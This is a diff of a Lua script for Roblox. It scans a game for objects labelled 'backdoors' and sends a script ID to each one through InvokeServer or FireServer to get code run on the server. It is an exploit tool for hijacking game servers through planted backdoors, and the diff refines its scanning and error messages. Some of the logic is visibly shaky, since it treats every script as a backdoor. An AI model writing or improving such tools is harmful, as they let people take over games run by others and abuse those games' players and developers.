@@ -19,22 +19,17 @@ local function scanForBackdoors()
     local backdoors = {}
     local methods = {"RemoteEvent", "RemoteFunction", "LoadString", "require", "ModuleScript", "Script"}
 
-    local function scan()
-        for _, obj in pairs(game:GetDescendants()) do
-            for _, method in pairs(methods) do
-                if obj:IsA(method) or (obj:IsA("ModuleScript") and obj.Source:find("require")) then
-                    table.insert(backdoors, "[WARNING] Suspicious Object Found: " .. obj:GetFullName())
-                end
-                if obj:IsA("Script") and obj.Source:find("require") then
-                    table.insert(backdoors, "[ALERT] Potential Exploit Script Detected: " .. obj:GetFullName())
-                end
-                wait() -- Yield to avoid freezing
+    for _, obj in pairs(game:GetDescendants()) do
+        coroutine.yield()
+        for _, method in pairs(methods) do
+            if obj:IsA(method) or (obj:IsA("ModuleScript") and obj.Source:find("require")) then
+                table.insert(backdoors, obj)
+            end
+            if obj:IsA("Script") and obj.Source:find("require") then
+                table.insert(backdoors, obj)
             end
         end
     end
-
-    local co = coroutine.create(scan)
-    coroutine.resume(co)
     return backdoors
 end
 
@@ -44,9 +39,9 @@ local function executeServerRequire(scriptID)
     local backdoors = scanForBackdoors()
     for _, backdoor in ipairs(backdoors) do
         local success, result = pcall(function()
-            local obj = game:GetService("ReplicatedStorage"):FindFirstChild(backdoor)
+            local obj = game:GetService("ReplicatedStorage"):FindFirstChild(backdoor.Name)
             if not obj then
-                error("[ERROR] Backdoor object not found: " .. backdoor)
+                error("[ERROR] Backdoor object not found: " .. backdoor:GetFullName())
             end
             if obj:IsA("RemoteFunction") then
                 return obj:InvokeServer(scriptID)
@@ -54,14 +49,14 @@ local function executeServerRequire(scriptID)
                 obj:FireServer(scriptID)
                 return "[SUCCESS] Fired RemoteEvent"
             else
-                error("[ERROR] No suitable RemoteFunction or RemoteEvent found for backdoor: " .. backdoor)
+                error("[ERROR] No suitable RemoteFunction or RemoteEvent found for backdoor: " .. backdoor:GetFullName())
             end
         end)
         if success then
-            print("[SUCCESS] Script Executed Successfully via backdoor: " .. backdoor)
+            print("[SUCCESS] Script Executed Successfully via backdoor: " .. backdoor:GetFullName())
             return result
         else
-            warn("[ERROR] Script Execution Failed via backdoor: " .. backdoor .. " - " .. result)
+            warn("[ERROR] Script Execution Failed via backdoor: " .. backdoor:GetFullName() .. " - " .. result)
         end
     end
     warn("[ERROR] No suitable backdoor found for script execution.")
